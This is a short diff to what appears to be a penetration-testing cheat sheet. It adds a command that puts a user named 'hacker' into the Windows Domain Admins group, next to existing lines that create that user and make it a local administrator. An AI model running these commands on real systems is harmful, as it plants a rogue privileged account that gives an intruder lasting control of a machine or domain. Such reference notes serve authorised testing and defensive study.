@@ -5,6 +5,7 @@
 ```powershell
 net user hacker hacker /add
 net localgroup administrators hacker /add
+net group "Domain Admins" hacker /ADD /DOMAIN
 ```
 
 Some info about your user
